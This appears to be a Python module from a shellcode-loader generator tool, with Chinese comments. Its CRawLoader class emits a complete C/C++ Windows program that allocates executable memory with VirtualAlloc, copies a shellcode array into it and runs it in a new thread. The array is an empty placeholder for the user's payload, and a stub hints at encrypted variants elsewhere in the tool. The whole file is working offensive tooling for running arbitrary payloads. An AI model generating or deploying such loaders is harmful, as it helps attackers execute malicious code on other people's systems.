#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
C/C++原始加载器模块：单一职责 - 仅实现C/C++原始加载器生成，遵循BaseLoader接口
"""
from core.loader.base_loader import BaseLoader

class CRawLoader(BaseLoader):
    """C/C++原始加载器：单一职责 - 仅生成C/C++原始加载器（无解密）"""
    @property
    def lang_name(self) -> str:
        return "C/C++"
    
    def generate_raw(self, shellcode_len: int) -> str:
        """生成C/C++原始加载器内容"""
        return """#include <windows.h>
#include <stdio.h>
#include <string.h>

int main() {
    // 占位符：替换为你的格式化后的shellcode
    // 重要：请将实际的shellcode填入下面的数组中
    unsigned char shellcode[] = { /* 此处填入字节数组格式shellcode */ };
    unsigned int shellcode_len = sizeof(shellcode);/* shellcode_len同步替换 */

    // 检查shellcode是否为空
    if (shellcode_len == 0) {
        printf("Error: Shellcode is empty. Please fill in the shellcode array.\\n");
        return 1;
    }

    // 打印shellcode信息
    printf("Shellcode length: %d bytes\\n", shellcode_len);

    // 分配可执行内存
    LPVOID mem = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (mem == NULL) {
        printf("VirtualAlloc failed with error: %d\\n", GetLastError());
        return 1;
    }

    // 打印内存分配信息
    printf("Allocated memory at: %p\\n", mem);

    // 复制shellcode到内存
    RtlMoveMemory(mem, shellcode, shellcode_len);
    printf("Copied shellcode to memory\\n");

    // 创建线程执行shellcode
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("CreateThread failed with error: %d\\n", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }

    // 打印线程创建信息
    printf("Created thread: %p\\n", hThread);

    // 等待线程执行完成
    WaitForSingleObject(hThread, INFINITE);
    printf("Thread execution completed\\n");

    // 清理资源
    CloseHandle(hThread);
    VirtualFree(mem, 0, MEM_RELEASE);

    printf("Cleanup completed\\n");

    return 0;
}"""
    
    def generate_decrypt(self, shellcode_len: int, encryption_history):
        """（原始加载器无需实现解密，抛出异常）"""
        raise NotImplementedError("原始加载器不支持解密功能")